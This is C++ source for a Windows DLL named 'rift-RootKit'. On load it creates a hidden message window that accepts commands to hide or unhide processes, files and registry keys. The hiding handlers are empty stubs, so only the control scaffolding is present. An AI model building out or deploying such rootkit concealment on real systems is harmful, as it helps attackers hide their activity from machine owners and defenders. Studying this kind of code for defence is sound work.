#include "riftrk.h"

struct IOCtlTCtx {
	HINSTANCE hInstDll;
	HANDLE hReadEvent;
};

// RootKit Controll
namespace rkc {
	LRESULT __stdcall IOCtlHandler(
		_In_     HWND   hWnd,
		_In_     uint32 uMsg,
		_In_opt_ WPARAM wParam,
		_In_opt_ LPARAM lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: {
				COPYDATASTRUCT* pcd = (COPYDATASTRUCT*)lParam;
			#define IOCTLLID(fd, id) ((fd << 4) | (id & 0xf))
				switch (pcd->dwData) {
				case IOCTLLID(0, 0): // Add Process to hide
					break;
				case IOCTLLID(0, 1): // Remove Process to hide
					break;

				case IOCTLLID(1, 0): // Add File/Directory to hide
					break;
				case IOCTLLID(1, 1): // Remove File/Directory to hide
					break;

				case IOCTLLID(2, 0): // Add RegistryKey to hide
					break;
				case IOCTLLID(2, 1): // Remove RegistryKey to hide
					break;

				case 0x7fffffff: // TestMessage
					return true;
				default:
					return false;
				}

				return true;
			}
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	dword __stdcall IOCtlSetup(
		_In_opt_ void* lpParameter
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = IOCtlHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ((IOCtlTCtx*)lpParameter)->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, MAKEINTATOM(awc), wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(((IOCtlTCtx*)lpParameter)->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet == -1) {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			} else
				DispatchMessageW(&msg);
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ dword     fdwReason,
	_In_ void*     pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	BreakPoint();

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		{
			HANDLE h[2];
			h[0] = CreateEventW(nullptr, false, false, nullptr);
			IOCtlTCtx ctx = { hinstDLL, h[0] };
			h[1] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

			WaitForMultipleObjects(2, h, false, INFINITE);
			CloseHandle(h[0]);

			dword ThreadExitCode;
			GetExitCodeThread(h[1], &ThreadExitCode);
			if (ThreadExitCode == STILL_ACTIVE)
				return true;
			return false; // Indicated that something failed to load
		}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:

		break;
	}

	return true;
}